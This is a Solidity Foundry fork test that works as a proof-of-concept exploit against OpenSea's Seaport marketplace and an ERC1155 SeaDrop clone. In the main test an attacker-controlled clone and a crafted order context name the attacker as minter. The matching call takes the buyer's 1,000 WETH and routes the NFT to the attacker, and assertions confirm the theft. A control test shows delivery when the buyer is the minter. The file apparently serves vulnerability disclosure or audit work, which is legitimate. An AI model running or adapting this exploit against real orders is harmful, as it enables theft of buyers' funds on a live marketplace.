// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {ERC1155SeaDropCloneFactory} from "src/clones/ERC1155SeaDropCloneFactory.sol";
import {PublicDrop} from "src/lib/ERC1155SeaDropStructs.sol";

import {ConsiderationInterface} from "seaport-types/src/interfaces/ConsiderationInterface.sol";
import {ItemType, OrderType} from "seaport-types/src/lib/ConsiderationEnums.sol";
import {
    AdvancedOrder,
    ConsiderationItem,
    CriteriaResolver,
    Fulfillment,
    FulfillmentComponent,
    OfferItem,
    Order,
    OrderComponents,
    OrderParameters
} from "seaport-types/src/lib/ConsiderationStructs.sol";

interface IERC1155BalanceSource {
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

interface IConduitSource {
    function getChannelStatus(address channel) external view returns (bool);
}

contract SourceLabWETH {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount)
        external
        returns (bool)
    {
        uint256 approved = allowance[from][msg.sender];
        require(approved >= amount, "ALLOWANCE");
        require(balanceOf[from] >= amount, "BALANCE");
        if (approved != type(uint256).max) {
            allowance[from][msg.sender] = approved - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OfficialSourceForkTest is Test {
    address internal constant SEAPORT =
        0x0000000000000068F116a894984e2DB1123eB395;
    address internal constant OPENSEA_CONDUIT =
        0x1e0049783f008a0085193e00003d00cd54003c71;
    bytes32 internal constant OPENSEA_CONDUIT_KEY =
        0x0000007b02230091a7c22b5bb0c9e86cdd3c13d1000000000000000000000000;
    bytes32 internal constant SEAPORT_RUNTIME_HASH =
        0x74499ac0cce14428e4b41541d5e44f28f5a6882a1051d0118867c2a93cd5aec0;

    uint256 internal constant PRICE = 1_000 ether;
    uint256 internal constant ID = 401;
    uint256 internal constant BUYER_KEY = 0xB0B9955;

    ConsiderationInterface internal constant seaport =
        ConsiderationInterface(SEAPORT);
    address internal buyer;
    address internal attacker = address(0xA77AC);
    address internal clone;
    SourceLabWETH internal weth;

    event SourceProof(
        bytes32 officialCloneRuntimeHash,
        uint256 buyerWethLoss,
        uint256 attackerWethGain,
        uint256 buyerNftGain,
        uint256 attackerNftGain,
        uint256 filled,
        uint256 size
    );

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), vm.envUint("FORK_BLOCK"));
        assertEq(keccak256(SEAPORT.code), SEAPORT_RUNTIME_HASH);
        assertTrue(IConduitSource(OPENSEA_CONDUIT).getChannelStatus(SEAPORT));

        buyer = vm.addr(BUYER_KEY);
        weth = new SourceLabWETH();

        ERC1155SeaDropCloneFactory factory =
            new ERC1155SeaDropCloneFactory(SEAPORT);
        vm.prank(attacker);
        clone = factory.createClone(
            "Official Source Gold",
            "OSG",
            keccak256(abi.encode(block.number, attacker))
        );

        vm.prank(attacker);
        (bool maxOk, bytes memory maxData) = clone.call(
            abi.encodeWithSignature(
                "setMaxSupply(uint256,uint256)", ID, uint256(100)
            )
        );
        if (!maxOk) _bubble(maxData);

        PublicDrop memory drop;
        drop.startPrice = 0;
        drop.endPrice = 0;
        drop.startTime = uint40(block.timestamp);
        drop.endTime = type(uint40).max;
        drop.restrictFeeRecipients = false;
        drop.paymentToken = address(0);
        drop.fromTokenId = uint24(ID);
        drop.toTokenId = uint24(ID);
        drop.maxTotalMintableByWallet = type(uint16).max;
        drop.maxTotalMintableByWalletPerToken = type(uint16).max;
        drop.feeBps = 0;

        vm.prank(attacker);
        (bool dropOk, bytes memory dropData) = clone.call(
            abi.encodeWithSignature(
                "updatePublicDrop((uint80,uint80,uint40,uint40,bool,address,uint24,uint24,uint16,uint16,uint16),uint256)",
                drop,
                uint256(0)
            )
        );
        if (!dropOk) _bubble(dropData);

        weth.mint(buyer, PRICE);
        vm.prank(buyer);
        weth.approve(OPENSEA_CONDUIT, type(uint256).max);
    }

    function testOfficialSourceArbitraryMatcherPaymentWithoutDelivery() public {
        Order memory buyerOrder = _buyerOrder();
        bytes32 orderHash = _hash(buyerOrder.parameters);
        Order[] memory orders = new Order[](1);
        orders[0] = buyerOrder;
        vm.prank(buyer);
        assertTrue(seaport.validate(orders));

        AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
        advanced[0] = AdvancedOrder(
            buyerOrder.parameters, 1, 1, bytes(""), bytes("")
        );
        advanced[1] = _dropOrder(address(0));

        uint256 bw0 = weth.balanceOf(buyer);
        uint256 aw0 = weth.balanceOf(attacker);
        uint256 bn0 = IERC1155BalanceSource(clone).balanceOf(buyer, ID);
        uint256 an0 = IERC1155BalanceSource(clone).balanceOf(attacker, ID);

        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            _fulfillment(),
            attacker
        );

        uint256 bw1 = weth.balanceOf(buyer);
        uint256 aw1 = weth.balanceOf(attacker);
        uint256 bn1 = IERC1155BalanceSource(clone).balanceOf(buyer, ID);
        uint256 an1 = IERC1155BalanceSource(clone).balanceOf(attacker, ID);
        (, , uint256 filled, uint256 size) = seaport.getOrderStatus(orderHash);

        emit SourceProof(
            keccak256(clone.code),
            bw0 - bw1,
            aw1 - aw0,
            bn1 - bn0,
            an1 - an0,
            filled,
            size
        );

        assertEq(bw1, bw0 - PRICE);
        assertEq(aw1, aw0 + PRICE);
        assertEq(bn1, bn0);
        assertEq(an1, an0 + 1);
        assertEq(filled, 1);
        assertEq(size, 1);
    }

    function testExplicitBuyerMinterControlDelivers() public {
        Order memory buyerOrder = _buyerOrder();
        Order[] memory orders = new Order[](1);
        orders[0] = buyerOrder;
        vm.prank(buyer);
        assertTrue(seaport.validate(orders));

        AdvancedOrder[] memory advanced = new AdvancedOrder[](2);
        advanced[0] = AdvancedOrder(
            buyerOrder.parameters, 1, 1, bytes(""), bytes("")
        );
        advanced[1] = _dropOrder(buyer);

        vm.prank(attacker);
        seaport.matchAdvancedOrders(
            advanced,
            new CriteriaResolver[](0),
            _fulfillment(),
            attacker
        );

        assertEq(IERC1155BalanceSource(clone).balanceOf(buyer, ID), 1);
        assertEq(IERC1155BalanceSource(clone).balanceOf(attacker, ID), 0);
    }

    function _buyerOrder() internal view returns (Order memory order) {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem(ItemType.ERC20, address(weth), 0, PRICE, PRICE);
        ConsiderationItem[] memory consideration = new ConsiderationItem[](1);
        consideration[0] = ConsiderationItem(
            ItemType.ERC1155, clone, ID, 1, 1, payable(buyer)
        );
        order = Order(
            OrderParameters(
                buyer,
                address(0),
                offer,
                consideration,
                OrderType.FULL_OPEN,
                0,
                type(uint256).max,
                bytes32(0),
                0x51A,
                OPENSEA_CONDUIT_KEY,
                1
            ),
            bytes("")
        );
    }

    function _dropOrder(address minter)
        internal
        view
        returns (AdvancedOrder memory order)
    {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem(ItemType.ERC1155, clone, ID, 1, 1);
        order = AdvancedOrder(
            OrderParameters(
                clone,
                address(0),
                offer,
                new ConsiderationItem[](0),
                OrderType.CONTRACT,
                0,
                type(uint256).max,
                bytes32(0),
                0,
                OPENSEA_CONDUIT_KEY,
                0
            ),
            1,
            1,
            bytes(""),
            _context(minter)
        );
    }

    function _context(address minter) internal view returns (bytes memory data) {
        data = new bytes(74);
        data[0] = 0x00;
        data[1] = 0x00;
        _writeAddress(data, 2, attacker);
        _writeAddress(data, 22, minter);
    }

    function _fulfillment()
        internal
        pure
        returns (Fulfillment[] memory fulfillments)
    {
        fulfillments = new Fulfillment[](1);
        FulfillmentComponent[] memory offerComponents =
            new FulfillmentComponent[](1);
        offerComponents[0] = FulfillmentComponent(1, 0);
        FulfillmentComponent[] memory considerationComponents =
            new FulfillmentComponent[](1);
        considerationComponents[0] = FulfillmentComponent(0, 0);
        fulfillments[0] = Fulfillment(
            offerComponents, considerationComponents
        );
    }

    function _hash(OrderParameters memory params) internal view returns (bytes32) {
        return seaport.getOrderHash(
            OrderComponents(
                params.offerer,
                params.zone,
                params.offer,
                params.consideration,
                params.orderType,
                params.startTime,
                params.endTime,
                params.zoneHash,
                params.salt,
                params.conduitKey,
                seaport.getCounter(params.offerer)
            )
        );
    }

    function _writeAddress(bytes memory data, uint256 offset, address value)
        internal
        pure
    {
        assembly {
            mstore(add(add(data, 0x20), offset), shl(96, value))
        }
    }

    function _bubble(bytes memory data) internal pure {
        assembly {
            revert(add(data, 0x20), mload(data))
        }
    }
}
